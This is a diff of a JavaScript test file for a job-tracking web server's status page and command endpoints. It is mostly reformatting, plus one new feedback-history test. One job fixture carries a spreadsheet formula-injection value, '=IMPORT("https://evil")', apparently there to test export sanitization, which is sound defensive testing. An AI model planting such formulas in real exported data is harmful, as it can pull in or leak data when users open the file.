@@ -141,20 +141,20 @@ const EXPECTED_CONTENT_SECURITY_POLICY = [
   "form-action 'self'",
   "frame-ancestors 'none'",
   "object-src 'none'",
-].join('; ');
+].join("; ");
 
 const EXPECTED_PERMISSIONS_POLICY = [
-  'accelerometer=()',
-  'autoplay=()',
-  'camera=()',
-  'geolocation=()',
-  'gyroscope=()',
-  'microphone=()',
-  'payment=()',
-  'usb=()',
-].join(', ');
+  "accelerometer=()",
+  "autoplay=()",
+  "camera=()",
+  "geolocation=()",
+  "gyroscope=()",
+  "microphone=()",
+  "payment=()",
+  "usb=()",
+].join(", ");
 
-const EXPECTED_REFERRER_POLICY = 'strict-origin-when-cross-origin';
+const EXPECTED_REFERRER_POLICY = "strict-origin-when-cross-origin";
 
 afterEach(async () => {
   for (const socket of activeSockets.splice(0)) {
@@ -196,7 +196,9 @@ describe("websocket event stream", () => {
       new Promise((resolve, reject) => {
         const ws = new WebSocket(server.eventsUrl);
         activeSockets.push(ws);
-        ws.once("open", () => reject(new Error("unexpected websocket success")));
+        ws.once("open", () =>
+          reject(new Error("unexpected websocket success")),
+        );
         ws.once("error", (error) => resolve(error));
       }),
     ).resolves.toBeInstanceOf(Error);
@@ -207,7 +209,9 @@ describe("websocket event stream", () => {
           headers: { authorization: "Bearer auditor-token" },
         });
         activeSockets.push(ws);
-        ws.once("open", () => reject(new Error("unexpected websocket success")));
+        ws.once("open", () =>
+          reject(new Error("unexpected websocket success")),
+        );
         ws.once("error", (error) => resolve(error));
       }),
     ).resolves.toBeInstanceOf(Error);
@@ -216,7 +220,7 @@ describe("websocket event stream", () => {
   it("streams sanitized command events to authorized viewers", async () => {
     const commandAdapter = {
       summarize: vi.fn().mockResolvedValue({
-        stdout: "{\"ok\":true}",
+        stdout: '{"ok":true}',
         data: { ok: true },
       }),
     };
@@ -265,7 +269,7 @@ describe("websocket event stream", () => {
     });
     expect(event.timestamp).toMatch(/Z$/);
     expect(event.result).toEqual({
-      stdout: "{\"ok\":true}",
+      stdout: '{"ok":true}',
       data: { ok: true },
     });
   });
@@ -506,7 +510,9 @@ describe("web server status page", () => {
     expect(css).toContain("--jobbot-color-danger");
     expect(css).toContain("--jobbot-color-text-primary");
     expect(css).toContain("--jobbot-color-text-secondary");
-    expect(css).toMatch(/body\s*\{[^}]*color:\s*var\(--jobbot-color-text-primary\)/);
+    expect(css).toMatch(
+      /body\s*\{[^}]*color:\s*var\(--jobbot-color-text-primary\)/,
+    );
     expect(css).toMatch(
       /\.status-panel[^{}]*\{[^}]*background-color:[^;\n]*var\([^)]*--jobbot-color-surface/,
     );
@@ -522,7 +528,7 @@ describe("web server status page", () => {
     const { document } = dom.window;
 
     const exportButton = document.querySelector(
-      'button.button[data-shortlist-export-json]',
+      "button.button[data-shortlist-export-json]",
     );
     expect(exportButton).not.toBeNull();
 
@@ -537,7 +543,9 @@ describe("web server status page", () => {
     const timeline = document.querySelector("ul.timeline[data-detail-events]");
     expect(timeline).not.toBeNull();
 
-    const stylesheetResponse = await fetch(`${server.url}/assets/status-hub.css`);
+    const stylesheetResponse = await fetch(
+      `${server.url}/assets/status-hub.css`,
+    );
     expect(stylesheetResponse.status).toBe(200);
     const css = await stylesheetResponse.text();
     expect(css).toContain(".button");
@@ -601,10 +609,7 @@ describe("web server status page", () => {
           ],
         },
       },
-      missingSecrets: [
-        "JOBBOT_GREENHOUSE_TOKEN",
-        "JOBBOT_LEVER_API_TOKEN",
-      ],
+      missingSecrets: ["JOBBOT_GREENHOUSE_TOKEN", "JOBBOT_LEVER_API_TOKEN"],
     });
 
     const { dom } = await renderStatusDom(server, { autoBoot: false });
@@ -624,7 +629,9 @@ describe("web server status page", () => {
 
     const secretsContainer = document.querySelector("[data-missing-secrets]");
     expect(secretsContainer).not.toBeNull();
-    const secretsText = secretsContainer?.textContent?.replace(/\s+/g, " ")?.trim();
+    const secretsText = secretsContainer?.textContent
+      ?.replace(/\s+/g, " ")
+      ?.trim();
     expect(secretsText).toContain("JOBBOT_GREENHOUSE_TOKEN");
     expect(secretsText).toContain("JOBBOT_LEVER_API_TOKEN");
 
@@ -634,10 +641,7 @@ describe("web server status page", () => {
     expect(manifestScript).not.toBeNull();
     const parsed = JSON.parse(manifestScript?.textContent ?? "{}");
     expect(parsed).toMatchObject({
-      missingSecrets: [
-        "JOBBOT_GREENHOUSE_TOKEN",
-        "JOBBOT_LEVER_API_TOKEN",
-      ],
+      missingSecrets: ["JOBBOT_GREENHOUSE_TOKEN", "JOBBOT_LEVER_API_TOKEN"],
       features: {
         scraping: { useMocks: true },
         notifications: { enableWeeklySummary: false },
@@ -912,7 +916,7 @@ describe("web server status page", () => {
         id: "job-1",
         metadata: {
           location: "Remote",
-          level: "=IMPORT(\"https://evil\")",
+          level: '=IMPORT("https://evil")',
           compensation: "$185k",
           synced_at: "2025-03-01T00:00:00.000Z",
         },
@@ -1142,7 +1146,14 @@ describe("web server status page", () => {
       stdout: JSON.stringify({ total: 0, offset: 0, limit: 10, items: [] }),
       stderr: "",
       returnValue: 0,
-      data: { total: 0, offset: 0, limit: 10, items: [], filters: {}, hasMore: false },
+      data: {
+        total: 0,
+        offset: 0,
+        limit: 10,
+        items: [],
+        filters: {},
+        hasMore: false,
+      },
     };
     const recruiterData = {
       opportunity: {
@@ -1198,7 +1209,9 @@ describe("web server status page", () => {
     await waitForEvent("jobbot:applications-loaded");
     expect(commandAdapter["shortlist-list"]).toHaveBeenCalledTimes(1);
 
-    const openButton = dom.window.document.querySelector("[data-recruiter-open]");
+    const openButton = dom.window.document.querySelector(
+      "[data-recruiter-open]",
+    );
     expect(openButton).not.toBeNull();
     openButton?.dispatchEvent(
       new dom.window.MouseEvent("click", { bubbles: true, cancelable: true }),
@@ -1208,7 +1221,9 @@ describe("web server status page", () => {
     expect(modal).not.toBeNull();
     expect(modal?.hasAttribute("hidden")).toBe(false);
 
-    const textarea = dom.window.document.querySelector("[data-recruiter-input]");
+    const textarea = dom.window.document.querySelector(
+      "[data-recruiter-input]",
+    );
     expect(textarea).not.toBeNull();
     if (textarea) {
       textarea.value = "Subject: Future Works recruiter outreach";
@@ -1224,7 +1239,7 @@ describe("web server status page", () => {
     );
 
     const ingestedEvent = await ingestedPromise;
-    await new Promise(resolve => dom.window.setTimeout(resolve, 0));
+    await new Promise((resolve) => dom.window.setTimeout(resolve, 0));
 
     expect(commandAdapter["recruiter-ingest"]).toHaveBeenCalledTimes(1);
     expect(commandAdapter["recruiter-ingest"]).toHaveBeenCalledWith({
@@ -1232,10 +1247,14 @@ describe("web server status page", () => {
     });
     expect(commandAdapter["shortlist-list"]).toHaveBeenCalledTimes(2);
 
-    const message = dom.window.document.querySelector("[data-recruiter-message]");
+    const message = dom.window.document.querySelector(
+      "[data-recruiter-message]",
+    );
     expect(message?.textContent).toContain("Future Works");
 
-    const preview = dom.window.document.querySelector("[data-recruiter-preview]");
+    const preview = dom.window.document.querySelector(
+      "[data-recruiter-preview]",
+    );
     expect(preview?.textContent).toContain("Future Works");
     expect(preview?.textContent).toContain("Subject");
     expect(preview?.textContent).toContain("Future Works recruiter outreach");
@@ -1274,7 +1293,7 @@ describe("web server status page", () => {
       }),
     };
     commandAdapter.shortlistList = commandAdapter["shortlist-list"];
-    
+
     const server = await startServer({ commandAdapter });
     const { dom, boot } = await renderStatusDom(server, {
       pretendToBeVisual: true,
@@ -1366,7 +1385,9 @@ describe("web server status page", () => {
   });
 
   it("snoozes and completes reminders through command endpoints", async () => {
-    const dataDir = await fs.mkdtemp(path.join(process.cwd(), "tmp-reminders-"));
+    const dataDir = await fs.mkdtemp(
+      path.join(process.cwd(), "tmp-reminders-"),
+    );
     const eventsPath = path.join(dataDir, "application_events.json");
     await fs.writeFile(
       eventsPath,
@@ -1391,11 +1412,17 @@ describe("web server status page", () => {
     const headers = buildCommandHeaders(server);
 
     try {
-      const snoozeResponse = await fetch(`${server.url}/commands/track-reminders-snooze`, {
-        method: "POST",
-        headers,
-        body: JSON.stringify({ jobId: "job-9", until: "2025-03-04T09:30:00Z" }),
-      });
+      const snoozeResponse = await fetch(
+        `${server.url}/commands/track-reminders-snooze`,
+        {
+          method: "POST",
+          headers,
+          body: JSON.stringify({
+            jobId: "job-9",
+            until: "2025-03-04T09:30:00Z",
+          }),
+        },
+      );
 
       expect(snoozeResponse.status).toBe(200);
       const snoozePayload = await snoozeResponse.json();
@@ -1404,11 +1431,17 @@ describe("web server status page", () => {
         jobId: "job-9",
       });
 
-      const doneResponse = await fetch(`${server.url}/commands/track-reminders-done`, {
-        method: "POST",
-        headers,
-        body: JSON.stringify({ jobId: "job-9", completedAt: "2025-03-05T08:00:00Z" }),
-      });
+      const doneResponse = await fetch(
+        `${server.url}/commands/track-reminders-done`,
+        {
+          method: "POST",
+          headers,
+          body: JSON.stringify({
+            jobId: "job-9",
+            completedAt: "2025-03-05T08:00:00Z",
+          }),
+        },
+      );
 
       expect(doneResponse.status).toBe(200);
       const donePayload = await doneResponse.json();
@@ -2317,7 +2350,7 @@ describe("web server status page", () => {
   it("applies analytics filters via the dashboard form", async () => {
     const funnelPayloads = [];
     const commandAdapter = {
-      "analytics-funnel": vi.fn(async payload => {
+      "analytics-funnel": vi.fn(async (payload) => {
         funnelPayloads.push(payload ?? {});
         return {
           command: "analytics-funnel",
@@ -2328,10 +2361,24 @@ describe("web server status page", () => {
           data: {
             totals: { trackedJobs: 3, withEvents: 2 },
             stages: [
-              { key: "outreach", label: "Outreach", count: 2, conversionRate: 1 },
-              { key: "screening", label: "Screening", count: 1, conversionRate: 0.5 },
+              {
+                key: "outreach",
+                label: "Outreach",
+                count: 2,
+                conversionRate: 1,
+              },
+              {
+                key: "screening",
+                label: "Screening",
+                count: 1,
+                conversionRate: 0.5,
+              },
             ],
-            largestDropOff: { fromLabel: "Outreach", toLabel: "Screening", dropOff: 1 },
+            largestDropOff: {
+              fromLabel: "Outreach",
+              toLabel: "Screening",
+              dropOff: 1,
+            },
             missing: { statuslessJobs: { count: 0 } },
             sankey: { nodes: [], links: [] },
           },
@@ -2347,7 +2394,8 @@ describe("web server status page", () => {
       autoBoot: false,
     });
 
-    const waitForEvent = (name, timeout = 500) => waitForDomEvent(dom, name, timeout);
+    const waitForEvent = (name, timeout = 500) =>
+      waitForDomEvent(dom, name, timeout);
 
     const readyPromise = waitForEvent("jobbot:analytics-ready");
     await boot();
@@ -2363,9 +2411,11 @@ describe("web server status page", () => {
     const form = dom.window.document.querySelector("[data-analytics-filters]");
     expect(form).not.toBeNull();
 
-    const fromInput = form?.querySelector("[data-analytics-filter=\"from\"]");
-    const toInput = form?.querySelector("[data-analytics-filter=\"to\"]");
-    const companyInput = form?.querySelector("[data-analytics-filter=\"company\"]");
+    const fromInput = form?.querySelector('[data-analytics-filter="from"]');
+    const toInput = form?.querySelector('[data-analytics-filter="to"]');
+    const companyInput = form?.querySelector(
+      '[data-analytics-filter="company"]',
+    );
 
     expect(fromInput).not.toBeNull();
     expect(toInput).not.toBeNull();
@@ -3604,8 +3654,16 @@ describe("web server command endpoint", () => {
       commandAdapter,
       auth: {
         tokens: [
-          { token: "viewer-token", subject: "viewer@example.com", roles: ["viewer"] },
-          { token: "editor-token", subject: "editor@example.com", roles: ["editor"] },
+          {
+            token: "viewer-token",
+            subject: "viewer@example.com",
+            roles: ["viewer"],
+          },
+          {
+            token: "editor-token",
+            subject: "editor@example.com",
+            roles: ["editor"],
+          },
         ],
         scheme: "Bearer",
       },
@@ -3641,10 +3699,13 @@ describe("web server command endpoint", () => {
     expect(editorResponse.status).toBe(200);
     await editorResponse.json();
 
-    const viewerHistory = await fetch(`${server.url}/commands/payloads/recent`, {
-      method: "GET",
-      headers: viewerHeaders,
-    });
+    const viewerHistory = await fetch(
+      `${server.url}/commands/payloads/recent`,
+      {
+        method: "GET",
+        headers: viewerHeaders,
+      },
+    );
     expect(viewerHistory.status).toBe(200);
     const viewerBody = await viewerHistory.json();
     expect(viewerBody.entries).toEqual([
@@ -3656,10 +3717,13 @@ describe("web server command endpoint", () => {
       },
     ]);
 
-    const editorHistory = await fetch(`${server.url}/commands/payloads/recent`, {
-      method: "GET",
-      headers: editorHeaders,
-    });
+    const editorHistory = await fetch(
+      `${server.url}/commands/payloads/recent`,
+      {
+        method: "GET",
+        headers: editorHeaders,
+      },
+    );
     expect(editorHistory.status).toBe(200);
     const editorBody = await editorHistory.json();
     expect(editorBody.entries).toEqual([
@@ -3694,7 +3758,9 @@ describe("web server command endpoint", () => {
     const bootstrapCookieHeader = bootstrapCookies
       .map((entry) => entry.split(";")[0])
       .join("; ");
-    const commandHeaders = buildCommandHeaders(server, { cookie: bootstrapCookieHeader });
+    const commandHeaders = buildCommandHeaders(server, {
+      cookie: bootstrapCookieHeader,
+    });
 
     const response = await fetch(`${server.url}/commands/summarize`, {
       method: "POST",
@@ -3737,7 +3803,9 @@ describe("web server command endpoint", () => {
     const statusResponse = await fetch(`${server.url}/`);
     const bootstrapCookies = statusResponse.headers.getSetCookie?.() ?? [];
     const csrfToken = server.csrfToken ?? "test-csrf-token";
-    const bootstrapCookieHeader = bootstrapCookies.map((entry) => entry.split(";")[0]).join("; ");
+    const bootstrapCookieHeader = bootstrapCookies
+      .map((entry) => entry.split(";")[0])
+      .join("; ");
     const commandHeaders = {
       ...buildCommandHeaders(server, {}, { includeCookie: false }),
       cookie: bootstrapCookieHeader,
@@ -3765,7 +3833,9 @@ describe("web server command endpoint", () => {
       method: "GET",
       headers: {
         ...commandHeaders,
-        cookie: [commandHeaders.cookie, cookieHeader].filter(Boolean).join("; "),
+        cookie: [commandHeaders.cookie, cookieHeader]
+          .filter(Boolean)
+          .join("; "),
       },
     });
 
@@ -3809,6 +3879,83 @@ describe("web server command endpoint", () => {
     };
 
     await expectRedactedBinaryPayloadHistory(commandAdapter);
+  });
+
+  it("records feedback submissions and exposes sanitized payload history", async () => {
+    const commandAdapter = {
+      "feedback-record": vi.fn(async (payload) => ({
+        ok: true,
+        stored: payload,
+      })),
+    };
+
+    const server = await startServer({ commandAdapter });
+    const headers = buildCommandHeaders(server);
+
+    const response = await fetch(`${server.url}/commands/feedback-record`, {
+      method: "POST",
+      headers,
+      body: JSON.stringify({
+        message: "  Loved the beta\u0007",
+        source: "  survey  ",
+        contact: "casey@example.com  ",
+        rating: "5",
+      }),
+    });
+
+    expect(response.status).toBe(200);
+    const body = await response.json();
+    expect(commandAdapter["feedback-record"]).toHaveBeenCalledWith({
+      contact: "casey@example.com",
+      message: "Loved the beta",
+      rating: 5,
+      source: "survey",
+    });
+    expect(body).toEqual({
+      ok: true,
+      stored: {
+        contact: "casey@example.com",
+        message: "Loved the beta",
+        rating: 5,
+        source: "survey",
+      },
+    });
+
+    const cookies = response.headers.getSetCookie?.() ?? [];
+    const cookieHeader = cookies.map((entry) => entry.split(";")[0]).join("; ");
+
+    const history = await fetch(`${server.url}/commands/payloads/recent`, {
+      method: "GET",
+      headers: {
+        ...headers,
+        cookie: [headers.cookie, cookieHeader].filter(Boolean).join("; "),
+      },
+    });
+
+    expect(history.status).toBe(200);
+    const historyBody = await history.json();
+    expect(historyBody.entries).toEqual([
+      {
+        command: "feedback-record",
+        payload: {
+          contact: "casey@example.com",
+          message: "Loved the beta",
+          rating: 5,
+          source: "survey",
+        },
+        result: {
+          ok: true,
+          status: "success",
+          stored: {
+            contact: "casey@example.com",
+            message: "Loved the beta",
+            rating: 5,
+            source: "survey",
+          },
+        },
+        timestamp: expect.any(String),
+      },
+    ]);
   });
 
   it("redacts command results in payload history when adapters return array buffers", async () => {
@@ -4125,13 +4272,16 @@ describe("web server command endpoint", () => {
     expect((guest2Session ?? "").trim()).not.toBe("");
     expect(guest2Session).not.toBe(guest1Session);
 
-    const guest1History = await fetch(`${server.url}/commands/payloads/recent`, {
-      method: "GET",
-      headers: {
-        ...guest1Headers,
-        [sessionHeader]: guest1Session,
+    const guest1History = await fetch(
+      `${server.url}/commands/payloads/recent`,
+      {
+        method: "GET",
+        headers: {
+          ...guest1Headers,
+          [sessionHeader]: guest1Session,
+        },
       },
-    });
+    );
     expect(guest1History.status).toBe(200);
     const guest1Body = await guest1History.json();
     expect(guest1Body.entries).toEqual([
@@ -4143,13 +4293,16 @@ describe("web server command endpoint", () => {
       },
     ]);
 
-    const guest2History = await fetch(`${server.url}/commands/payloads/recent`, {
-      method: "GET",
-      headers: {
-        ...guest2Headers,
-        [sessionHeader]: guest2Session,
+    const guest2History = await fetch(
+      `${server.url}/commands/payloads/recent`,
+      {
+        method: "GET",
+        headers: {
+          ...guest2Headers,
+          [sessionHeader]: guest2Session,
+        },
       },
-    });
+    );
     expect(guest2History.status).toBe(200);
     const guest2Body = await guest2History.json();
     expect(guest2Body.entries).toEqual([
@@ -4183,9 +4336,9 @@ describe("web server command endpoint", () => {
     expect(first.status).toBe(200);
     expect(first.headers.get("x-ratelimit-limit")).toBe("2");
     expect(first.headers.get("x-ratelimit-remaining")).toBe("1");
-    expect(new Date(first.headers.get("x-ratelimit-reset") ?? "").getTime()).toBeGreaterThan(
-      Date.now(),
-    );
+    expect(
+      new Date(first.headers.get("x-ratelimit-reset") ?? "").getTime(),
+    ).toBeGreaterThan(Date.now());
 
     const second = await fetch(`${server.url}/commands/summarize`, {
       method: "POST",
@@ -4207,9 +4360,9 @@ describe("web server command endpoint", () => {
     expect(third.headers.get("x-ratelimit-remaining")).toBe("0");
     const retryAfter = Number(third.headers.get("retry-after"));
     expect(retryAfter).toBeGreaterThanOrEqual(1);
-    expect(new Date(third.headers.get("x-ratelimit-reset") ?? "").getTime()).toBeGreaterThan(
-      Date.now(),
-    );
+    expect(
+      new Date(third.headers.get("x-ratelimit-reset") ?? "").getTime(),
+    ).toBeGreaterThan(Date.now());
     expect(commandAdapter.summarize).toHaveBeenCalledTimes(2);
   });
 
